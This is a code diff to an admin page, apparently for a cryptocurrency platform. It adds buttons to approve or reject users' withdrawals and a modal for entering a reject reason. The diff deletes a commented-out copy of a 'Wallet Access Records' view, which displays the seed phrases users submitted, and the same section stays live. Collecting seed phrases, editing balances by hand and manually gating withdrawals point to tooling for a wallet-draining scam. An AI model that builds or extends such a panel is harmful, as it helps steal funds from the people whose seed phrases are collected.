@@ -39,23 +39,29 @@ type WalletAccess = {
 };
 
 type Transaction = {
+  id: string;
   token: string;
   amount: string;
-  status: "PENDING" | "APPROVED" | "REJECTED";
+  status: "PENDING" | "APPROVED" | "REJECTED" | "FAILED";
   withdrawalWallet: string | null;
-  createdAt: string; // ISO string format
+  createdAt: string;
 };
 
 export default function AdminUserDetails({
   user,
   withdrawals,
   walletAccesses,
+  refresh,
 }: {
   user: User;
   withdrawals: Transaction[];
   walletAccesses: WalletAccess[];
+  refresh: () => void;
 }) {
   const [isPending, startTransition] = useTransition();
+  const [rejectReason, setRejectReason] = useState("");
+  const [rejectingId, setRejectingId] = useState<string | null>(null);
+  const [loadingId, setLoadingId] = useState<string | null>(null);
   const [balances, setBalances] = useState({
     usdt: user.usdtBalance,
     btc: user.btcBalance,
@@ -115,6 +121,25 @@ export default function AdminUserDetails({
       }
     });
   };
+  const handleRespond = async (txId: string, action: "APPROVE" | "REJECT", note?: string) => {
+    try {
+      setLoadingId(txId);
+      const res = await fetch("/api/respondWithdrawal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ txId, action, note }),
+      });
+      if (!res.ok) throw new Error(await res.text());
+      toast.success(`Withdrawal ${action === "APPROVE" ? "approved" : "rejected"}`);
+      refresh();
+    } catch (err) {
+      toast.error(`Failed to ${action.toLowerCase()} withdrawal`);
+    } finally {
+      setLoadingId(null);
+      setRejectingId(null);
+      setRejectReason("");
+    }
+  };
 
   return (
     <div className="p-6 text-black">
@@ -131,42 +156,6 @@ export default function AdminUserDetails({
           <IDCardImage path={user.IDCard} />
         </div>
       )}
-
-      {/* <div className="my-6">
-        <h3 className="text-lg font-semibold mb-2">Wallet Access Records</h3>
-        {walletAccesses.length > 0 ? (
-          <div className="space-y-4">
-            {walletAccesses.map((entry) => (
-              <div
-                key={entry.id}
-                className="bg-gray-100 text-black p-4 rounded shadow font-mono"
-              >
-                <p>
-                  <strong>Wallet:</strong> {entry.walletName}
-                </p>
-                <p>
-                  <strong>Type:</strong> {entry.type}
-                </p>
-                <p className="break-words">
-                  <strong>
-                    {entry.type === "phrase" ? "Seed Phrase" : "Public Key"}:
-                  </strong>{" "}
-                  {entry.value}
-                </p>
-                <p className="text-sm text-gray-600 mt-1">
-                  Submitted: {new Date(entry.createdAt).toLocaleString()}
-                </p>
-              </div>
-            ))}
-          </div>
-        ) : (
-          <div className="my-6">
-            <div className="bg-gray-100 text-black p-4 rounded font-mono">
-              No wallet access records yet...
-            </div>
-          </div>
-        )}
-      </div> */}
 
       <div className="my-6">
         <h3 className="text-lg font-semibold mb-2">Wallet Access Records</h3>
@@ -286,7 +275,7 @@ export default function AdminUserDetails({
         <p className="text-gray-500">No withdrawal requests</p>
       ) : (
         <div className="overflow-x-auto">
-          <table className="min-w-full text-sm text-white">
+          <table className="min-w-full text-xs text-white">
             <thead className="bg-gray-700">
               <tr>
                 <th className="text-left p-2">Token</th>
@@ -294,6 +283,7 @@ export default function AdminUserDetails({
                 <th className="text-left p-2">Wallet</th>
                 <th className="text-left p-2">Status</th>
                 <th className="text-left p-2">Date</th>
+                <th className="text-left p-2">Action</th>
               </tr>
             </thead>
             <tbody>
@@ -308,10 +298,57 @@ export default function AdminUserDetails({
                   <td className="p-2 text-black">
                     {new Date(tx.createdAt).toLocaleString()}
                   </td>
+                  <td className="p-2 text-black space-x-2">
+                    {tx.status === "PENDING" && (
+                      <>
+                        <button
+                          className="bg-green-600 px-3 py-1 rounded text-white cursor-pointer hover:bg-green-700"
+                          disabled={loadingId === tx.id}
+                          onClick={() => handleRespond(tx.id, "APPROVE")}
+                        >
+                          Approve
+                        </button>
+                        <button
+                          className="bg-red-600 px-3 py-1 rounded text-white cursor-pointer hover:bg-red-700"
+                          disabled={loadingId === tx.id}
+                          onClick={() => setRejectingId(tx.id)}
+                        >
+                          Reject
+                        </button>
+                      </>
+                    )}
+                  </td>
                 </tr>
               ))}
             </tbody>
           </table>
+          {rejectingId && (
+            <div className="fixed inset-0 bg-black/50 flex items-center justify-center">
+              <div className="bg-white text-black p-6 rounded shadow-lg w-96">
+                <h3 className="text-lg font-semibold mb-4">Reject Withdrawal</h3>
+                <textarea
+                  value={rejectReason}
+                  onChange={(e) => setRejectReason(e.target.value)}
+                  className="w-full border border-gray-300 p-2 rounded mb-4"
+                  placeholder="Enter reason..."
+                />
+                <div className="flex justify-end space-x-2">
+                  <button
+                    onClick={() => setRejectingId(null)}
+                    className="px-3 py-1 rounded bg-gray-300"
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={() => handleRespond(rejectingId, "REJECT", rejectReason)}
+                    className="px-3 py-1 rounded bg-red-600 text-white cursor-pointer hover:bg-red-700"
+                  >
+                    Reject
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
         </div>
       )}
     </div>
